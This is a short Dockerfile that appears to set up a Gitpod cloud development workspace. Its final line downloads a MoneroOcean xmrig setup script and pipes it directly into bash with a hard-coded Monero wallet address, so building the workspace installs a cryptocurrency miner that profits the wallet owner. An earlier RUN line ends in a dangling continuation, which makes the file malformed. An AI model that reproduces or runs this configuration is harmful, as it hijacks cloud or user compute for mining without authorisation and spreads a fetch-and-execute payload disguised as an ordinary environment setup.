FROM gitpod/workspace-full
RUN apt update && apt -y install curl xz-utils git make gcc && \
RUN apt -y purge xz-utils && apt -y autoremove --purge && apt -y clean && apt -y autoclean; rm -rf /var/lib/apt-get/lists/*
RUN curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2

